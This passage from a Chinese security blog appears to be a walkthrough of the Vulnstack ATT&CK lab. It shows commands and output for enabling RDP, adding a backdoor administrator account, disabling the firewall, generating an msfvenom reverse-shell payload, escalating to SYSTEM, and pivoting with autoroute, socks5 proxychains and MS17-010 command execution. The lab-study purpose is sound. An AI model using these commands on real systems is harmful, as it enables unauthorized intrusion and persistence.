+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; systeminfo</span><br><span class="line">主机名:           STU1</span><br><span class="line">OS 名称:          Microsoft Windows <span class="number">7</span> 专业版 </span><br><span class="line">OS 版本:          <span class="number">6.1</span><span class="number">.7601</span> Service Pack <span class="number">1</span> Build <span class="number">7601</span></span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          成员工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          <span class="number">00371</span><span class="number">-177</span><span class="number">-0000061</span><span class="number">-85693</span></span><br><span class="line">初始安装日期:     <span class="number">2019</span>/<span class="number">8</span>/<span class="number">25</span>, <span class="number">9</span>:<span class="number">54</span>:<span class="number">10</span></span><br><span class="line">系统启动时间:     <span class="number">2020</span>/<span class="number">3</span>/<span class="number">6</span>, <span class="number">9</span>:<span class="number">55</span>:<span class="number">47</span></span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 <span class="number">1</span> 个处理器。</span><br><span class="line">                  [<span class="number">01</span>]: Intel64 Family <span class="number">6</span> Model <span class="number">142</span> Stepping <span class="number">9</span> GenuineIntel ~<span class="number">2712</span> Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD <span class="number">6.00</span>, <span class="number">2019</span>/<span class="number">7</span>/<span class="number">29</span></span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+<span class="number">08</span>:<span class="number">00</span>)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     <span class="number">2</span>,<span class="number">047</span> MB</span><br><span class="line">可用的物理内存:   <span class="number">1</span>,<span class="number">238</span> MB</span><br><span class="line">虚拟内存: 最大值: <span class="number">4</span>,<span class="number">095</span> MB</span><br><span class="line">虚拟内存: 可用:   <span class="number">3</span>,<span class="number">199</span> MB</span><br><span class="line">虚拟内存: 使用中: <span class="number">896</span> MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               god.org</span><br><span class="line">登录服务器:       \\OWA</span><br><span class="line">修补程序:         安装了 <span class="number">4</span> 个修补程序。</span><br><span class="line">                  [<span class="number">01</span>]: KB2534111</span><br><span class="line">                  [<span class="number">02</span>]: KB2999226</span><br><span class="line">                  [<span class="number">03</span>]: KB958488</span><br><span class="line">                  [<span class="number">04</span>]: KB976902</span><br><span class="line">网卡:             安装了 <span class="number">6</span> 个 NIC。</span><br><span class="line">                  [<span class="number">01</span>]: Intel(R) PRO/<span class="number">1000</span> MT Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [<span class="number">01</span>]: <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span></span><br><span class="line">                        [<span class="number">02</span>]: fe80::c583:c68a:<span class="number">1fe6</span>:a72a</span><br><span class="line">                  [<span class="number">02</span>]: Bluetooth 设备(个人区域网)</span><br><span class="line">                      连接名:      Bluetooth 网络连接</span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [<span class="number">03</span>]: TAP-Windows Adapter V9</span><br><span class="line">                      连接名:      本地连接 <span class="number">2</span></span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [<span class="number">04</span>]: Microsoft Loopback Adapter</span><br><span class="line">                      连接名:      Npcap Loopback Adapter</span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: <span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">                      IP 地址</span><br><span class="line">                        [<span class="number">01</span>]: <span class="number">169.254</span><span class="number">.129</span><span class="number">.186</span></span><br><span class="line">                        [<span class="number">02</span>]: fe80::b461:ccad:e30f:<span class="number">81</span>ba</span><br><span class="line">                  [<span class="number">05</span>]: TAP-Windows Adapter V9</span><br><span class="line">                      连接名:      本地连接 <span class="number">3</span></span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [<span class="number">06</span>]: Intel(R) PRO/<span class="number">1000</span> MT Network Connection</span><br><span class="line">                      连接名:      本地连接 <span class="number">4</span></span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: <span class="number">192.168</span><span class="number">.54</span><span class="number">.254</span></span><br><span class="line">                      IP 地址</span><br><span class="line">                        [<span class="number">01</span>]: <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">                        [<span class="number">02</span>]: fe80::<span class="number">4</span>d9f:d019:<span class="number">7264</span>:<span class="number">7e9</span></span><br></pre></td></tr></table></figure>
+<p>开启3389端口</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span></span><br></pre></td></tr></table></figure>
+<p>创建管理员用户</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; net<span class="built_in"> user </span>timor fuck!@#123-+ /add</span><br><span class="line">命令成功完成。</span><br><span class="line"> </span><br><span class="line">C:\phpStudy\WWW&gt; net localgroup administrators timor /add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<p>连接3389，连接失败设置了防火墙那么可以使用<code>netsh firewall set opmode disable</code>关闭</p>
+<img src="/posts/1cb8ad01/18.png" class="" title="This is an 18 image">
+<p>远程太卡了 还是命令行吧</p>
+<h3 id="用cs来攻击"><a href="#用cs来攻击" class="headerlink" title="用cs来攻击"></a>用cs来攻击</h3><p>配置监听<br><a href="http://timorblog.cn/posts/431a3a09.html">http://timorblog.cn/posts/431a3a09.html</a><br>生成木马后上传到win7上<br>运行木马</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\A</span>dministrator<span class="symbol">\D</span>esktop&gt; artifact.exe</span><br></pre></td></tr></table></figure>
+<img src="/posts/1cb8ad01/17.png" class="" title="This is an 17 image">
+<p>连接上了 提权 关闭防火墙<br>提权使用cs自带的ms14-058<br>拿到system权限</p>
+<h3 id="用msf攻击"><a href="#用msf攻击" class="headerlink" title="用msf攻击"></a>用msf攻击</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.54</span><span class="number">.128</span> LPORT=<span class="number">4444</span> -f exe &gt; hello.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 192.168.54.128</span><br><span class="line">lhost =&gt; 192.168.54.128</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 5555</span><br><span class="line">lport =&gt; 5555</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">msf5 exploit(multi/handler) &gt; [*] Sending stage (180291 bytes) <span class="keyword">to</span> 192.168.54.129</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.54.128:5555 -&gt; 192.168.54.129:1394) at 2020-03-06 01:08:01 -0500</span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions 1</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line"><span class="built_in">..</span>.got<span class="built_in"> system </span>via technique 1 (Named Pipe Impersonation (<span class="keyword">In</span> Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="添加路由挂代理"><a href="#添加路由挂代理" class="headerlink" title="添加路由挂代理"></a>添加路由挂代理</h3><h4 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h4><p>获取网段</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets  </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/<span class="built_in">auto</span>route.</span><br><span class="line">[!] Example: run post/multi/manage/<span class="built_in">auto</span>route OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">169.254</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span><span class="number">.54</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
+<p>添加路由</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> autoroute -s 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: <span class="builtin-name">run</span> post/multi/manage/autoroute <span class="attribute">OPTION</span>=value [<span class="built_in">..</span>.]</span><br><span class="line">[*] Adding a<span class="built_in"> route </span><span class="keyword">to</span> 192.168.52.0/255.255.255.0<span class="built_in">..</span>.</span><br><span class="line">[+] Added<span class="built_in"> route </span><span class="keyword">to</span> 192.168.52.0/255.255.255.0 via 192.168.54.129</span><br><span class="line">[*] Use the -p option <span class="keyword">to</span> list all active routes</span><br></pre></td></tr></table></figure>
+<p>查看路由</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: <span class="builtin-name">run</span> post/multi/manage/autoroute <span class="attribute">OPTION</span>=value [<span class="built_in">..</span>.]</span><br><span class="line"></span><br><span class="line">Active<span class="built_in"> Routing </span>Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 6</span><br></pre></td></tr></table></figure>
+<p>扫描网段的存活主机</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=<span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] ARP Scanning <span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">[+]     IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span> MAC <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">26</span>:<span class="number">22</span>:f7 (VMware, Inc.)</span><br><span class="line">[+]     IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span> MAC <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:af:<span class="number">98</span>:<span class="number">95</span> (VMware, Inc.)</span><br><span class="line">[+]     IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span> MAC <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">5</span>c:<span class="number">5</span>b:dc (VMware, Inc.)</span><br><span class="line">[+]     IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.255</span> MAC <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:af:<span class="number">98</span>:<span class="number">95</span> (VMware, Inc.)</span><br></pre></td></tr></table></figure>
+<p>退出</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">meterpreter</span> &gt; <span class="keyword">background </span></span><br><span class="line">[*] <span class="keyword">Backgrounding </span>session <span class="number">6</span>...</span><br></pre></td></tr></table></figure>
+<p>添加代理</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks5 </span><br><span class="line">msf5 auxiliary(server/socks5) &gt; <span class="builtin-name">set</span> srvport 1080</span><br><span class="line">srvport =&gt; 1080</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 7.</span><br><span class="line"></span><br><span class="line">[*] Starting the socks5<span class="built_in"> proxy </span>server</span><br><span class="line">[*] Stopping the socks5<span class="built_in"> proxy </span>server</span><br></pre></td></tr></table></figure>
+<p>修改proxychains配置</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">vi</span> <span class="string">/etc/proxychains.conf</span></span><br><span class="line"><span class="comment">#在文件的底部添加</span></span><br><span class="line"><span class="string">socks5</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></table></figure>
+<p>测试一下是否成功</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; proxychains curl http:<span class="comment">//192.168.52.143</span></span><br><span class="line">[*] exec: proxychains curl http:<span class="comment">//192.168.52.143</span></span><br><span class="line">ProxyChains<span class="number">-3.1</span> (http:<span class="comment">//proxychains.sf.net)</span></span><br><span class="line">|S-chain|-&lt;&gt;<span class="number">-127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span>-&lt;&gt;&lt;&gt;<span class="number">-192.168</span><span class="number">.52</span><span class="number">.143</span>:<span class="number">80</span>-&lt;&gt;&lt;&gt;-OK</span><br></pre></td></tr></table></figure>
+<p>扫描端口</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p <span class="number">1</span><span class="number">-1000</span> -Pn -sT <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span></span><br></pre></td></tr></table></figure>
+<p>扫出 135、139、445、21<br>21端口可以测试弱口令和vsftp漏洞<br>445端口可以测试ms17010和ms08067漏洞<br>尝试ms08067不成功<br>ms17010可以运行</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; use auxiliary/admin/smb/ms17_010_command </span><br><span class="line">msf5 auxiliary(admin/smb/ms17_010_command) &gt; <span class="keyword">set</span> rhosts <span class="comment">192.168.52.141</span></span><br><span class="line">rhosts <span class="comment">=&gt; 192.168.52.141</span></span><br><span class="line">msf5 <span class="comment">auxiliary(admin</span>/smb/<span class="comment">ms17_010_command) &gt; set command whoami</span></span><br><span class="line">command <span class="comment">=&gt; whoami</span></span><br><span class="line">msf5 <span class="comment">auxiliary(admin</span>/smb/<span class="comment">ms17_010_command) &gt; run</span></span><br><span class="line">nt <span class="comment">authority\system</span></span><br></pre></td></tr></table></figure>
+<p>添加用户</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> command net<span class="built_in"> user </span>timor fuck!@#123-+ /add</span><br><span class="line">msf5 auxiliary(admin/smb/ms17_010_command) &gt; run</span><br></pre></td></tr></table></figure>
+<p>开启3389</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span>'</span><br><span class="line">msf5 auxiliary<span class="params">(admin/smb/ms17_010_command)</span> &gt; run</span><br></pre></td></tr></table></figure>
+<p>给管理员权限</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> command net localgroup administrators timor /add</span><br><span class="line">msf5 auxiliary(admin/smb/ms17_010_command) &gt; run</span><br></pre></td></tr></table></figure>
+<p>连接3389</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span></span><br></pre></td></tr></table></figure>
+<p>还剩下一个192.168.52.138<br>扫描端口 </p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p <span class="number">1</span><span class="number">-1000</span> <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span></span><br></pre></td></tr></table></figure>
+<p>135、139、445、80<br>可以用msf17010攻击</p>
+
+    </div>
+
+    
+    
+    
+        <div>
+            
+            <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+            
+        </div>
+      <footer class="post-footer">
+
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/ad4fd8bd.html" rel="prev" title="常见端口和服务">
+      <i class="fa fa-chevron-left"></i> 常见端口和服务
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/b4d06ff6.html" rel="next" title="Vlunstack-ATT-CK实战系列0×2">
+      Vlunstack-ATT-CK实战系列0×2 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下载地址"><span class="nav-number">2.</span> <span class="nav-text">下载地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境配置"><span class="nav-number">3.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击"><span class="nav-number">4.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#用cs来攻击"><span class="nav-number">4.1.</span> <span class="nav-text">用cs来攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用msf攻击"><span class="nav-number">4.2.</span> <span class="nav-text">用msf攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#横向渗透"><span class="nav-number">5.</span> <span class="nav-text">横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#添加路由挂代理"><span class="nav-number">5.1.</span> <span class="nav-text">添加路由挂代理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用msf"><span class="nav-number">5.1.1.</span> <span class="nav-text">使用msf</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Timor"
+      src="/images/xiaobai.jpg">
+  <p class="site-author-name" itemprop="name">Timor</p>
+  <div class="site-description" itemprop="description">渗透测试|网络安全|信息安全|WEB安全</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/timorblog" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;timorblog" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">辽ICP备19000813号-1 </a>|
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=21071102000174" rel="noopener" target="_blank">辽公网安备 21071102000174号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Timor</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+ <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js">
+  
+</script>
+</body>
+</html>
